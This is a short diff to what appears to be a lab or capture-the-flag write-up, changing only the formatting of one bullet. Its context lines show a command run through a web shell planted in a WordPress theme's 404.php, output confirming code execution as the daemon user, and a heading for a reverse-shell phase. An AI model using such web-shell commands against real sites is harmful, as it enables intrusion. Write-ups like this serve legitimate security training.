@@ -121,7 +121,7 @@ http://192.168.194.7/wp-content/themes/twentyfifteen/404.php?cmd=id
 ```
 - This command confirms successful remote command execution on the target.
 The output shows the current user context (daemon), verifying shell access.
-📌 Output:
+- 📌 Output:
 
 > uid=1(daemon) gid=1(daemon)
 🐚 Phase 6: Reverse Shell (WORKING METHOD)
